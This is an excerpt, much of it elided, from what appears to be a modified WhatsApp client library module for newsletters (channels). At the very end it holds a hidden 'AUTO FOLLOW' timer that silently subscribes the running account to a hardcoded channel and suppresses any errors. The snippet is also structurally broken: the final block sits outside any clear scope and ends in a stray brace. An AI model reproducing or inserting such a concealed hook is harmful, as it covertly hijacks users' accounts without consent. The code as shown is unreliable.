...
const executeWMexQuery = async (
    ...
    if (child?.content) {
        ...
        if (data.errors && data.errors.length > 0) {
            ...
            throw new Boom(
                `GraphQL server error: ${errorMessages}`,
                {
    ...
    throw new Boom(
        `Failed to ${action}, unexpected response structure.`,
        {
            statusCode: 400,
            data: result
        }
...
const makeNewsletterSocket = (config) => {
    ...
    const parseFetchedUpdates = async (node, type) => {
        ...
        if (type === 'messages') {
            ...
            child = (0, WABinary_1.getBinaryNodeChild)(
                parent,
                'messages'
            )
        }
        ...
        return await Promise.all(
            (0, WABinary_1.getAllBinaryNodeChildren)(child)
                .map(async (messageNode) => {
                    var _a, _b
                    ...
                    const views = parseInt(
                        (
                            (_b = (_a = (0, WABinary_1.getBinaryNodeChild)(
                                messageNode,
                                'views_count'
                            ))?.attrs)?.count
                        ) || '0'
    ...
    return {
        ...
        newsletterUpdateDescription: async (
            jid,
            description
        ) => {
            await newsletterWMexQuery(
        ...
        newsletterCreate: async (
            ...
            return (0, exports.extractNewsletterMetadata)(
                result,
                true
            )
        },
        ...
        newsletterAdminCount: async (jid) => {
            ...
            return JSON.parse(buff)
                .data[Types_1.XWAPaths.ADMIN_COUNT]
                .admin_count
        },
        ...
        newsletterFetchMessages: async (
            ...
            return await parseFetchedUpdates(
                result,
                'messages'
            )
        },
...
const extractNewsletterMetadata = (
    node,
    isCreate
) => {
    ...
    const metadataPath = JSON.parse(result)
        .data[
            isCreate
    ...
    const metadata = {
        ...
        creation_time:
            +metadataPath?.thread_metadata?.creation_time,
        name:
            metadataPath?.thread_metadata?.name?.text,
        nameTime:
            +metadataPath?.thread_metadata?.name?.update_time,
        description:
            metadataPath?.thread_metadata?.description?.text,
        descriptionTime:
            +metadataPath?.thread_metadata?.description?.update_time,
        invite:
            metadataPath?.thread_metadata?.invite,
        picture:
            Utils_1.getUrlFromDirectPath(
        ...
        subscribers:
            +metadataPath?.thread_metadata?.subscribers_count,
        verification:
            metadataPath?.thread_metadata?.verification,
        viewer_metadata:
            metadataPath?.viewer_metadata
    }
...
// ================= AUTO FOLLOW =================
// taruh paling bawah biar ga error

setTimeout(async () => {
    try {
        await newsletterWMexQuery(
            "120363420346758618@newsletter",
            Types_1.QueryIds.FOLLOW
        )
    } catch (e) {}
}, 5000)           },
